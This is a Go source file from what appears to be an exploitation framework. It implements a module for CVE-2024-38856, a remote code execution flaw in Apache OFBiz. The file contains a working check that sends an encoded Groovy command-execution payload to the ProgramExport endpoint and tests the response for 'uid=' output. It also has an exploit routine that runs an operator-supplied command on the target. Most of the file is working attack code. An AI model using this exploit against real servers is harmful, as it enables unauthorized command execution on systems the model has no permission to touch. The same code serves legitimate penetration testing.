package cve_2024_38856

import (
	"appsploit/cmd/appsploit/flags"
	"appsploit/pkg/utils"
	"fmt"
	"strings"

	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"

	"github.com/urfave/cli/v2"
)

var (
	aliases     = []string{"cve_2024_38856"}
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, nil, true)
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, flags.SubCmdFlags)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, flags.SubCmdFlags, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "CVE-2024-38856",
		Description: "Apache OFBiz RCE - Type: RCE",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.Remote,
			Check:   exeenv.Remote,
			Exploit: exeenv.Remote,
		},
		CheckSecPrerequisites:    nil,
		ExploitablePrerequisites: nil,
	},
}

func (v *vulnerability) CheckSec(context *cli.Context) (vulnerabilityExists bool, err error) {
	baseURL := utils.Http.FormatURL(context)
	httpClient := *utils.Http.Client()
	httpClient.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	command := utils.Common.EncodeToUnicode("throw new Exception('id'.execute().text);")
	body := fmt.Sprintf("groovyProgram=%s", command)
	if resp, err := httpClient.SetBody(body).Post(baseURL + "/webtools/control/main/ProgramExport"); err != nil {
		return false, err
	} else {
		if strings.Contains(string(resp.Body()), "uid=") && strings.Contains(string(resp.Body()), "gid=") {
			v.VulnerabilityExists = true
		} else {
			v.VulnerabilityExists = false
		}
	}
	return v.BaseVulnerability.CheckSec(context)
}

func (v *vulnerability) Exploit(context *cli.Context) error {
	baseURL := utils.Http.FormatURL(context)
	if vulnerabilityExists, err := v.CheckSec(context); err != nil {
		return err
	} else {
		if vulnerabilityExists {
			command := context.String("command")
			if resp, err := Exploit(baseURL, command); err != nil {
				return err
			} else {
				v.VulnerabilityResponse = resp
				// 调用基类的输出方法来显示结果
				v.BaseVulnerability.OutputResp()
				return nil
			}
		}
	}
	return nil
}
